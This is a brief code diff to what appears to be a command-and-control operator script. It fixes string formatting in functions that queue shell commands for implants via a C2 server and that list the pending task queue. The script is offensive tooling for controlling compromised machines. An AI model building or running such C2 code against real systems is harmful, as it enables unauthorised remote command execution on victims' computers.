@@ -13,7 +13,7 @@ shellcommand = f.read()
 f.close()
 
 def queue_cmd(cmd, agent_id):
-    r = requests.post(f"{c2_server}{path}", json=[{"implant_id": agent_id, "cmd": cmd}])
+    r = requests.post("{}{}".format(c2_server, path), json=[{"implant_id": agent_id, "cmd": cmd}])
     if r.text == "True":
         print("queued ")
     else:
@@ -22,7 +22,7 @@ def queue_cmd(cmd, agent_id):
 
 # checks the status of our task queue 
 def print_queue():
-    r = requests.get("{}/queue",format(c2_server))
+    r = requests.get("{}/queue".format(c2_server))
     if r.status_code == 200:
         print(r.json())
     else:
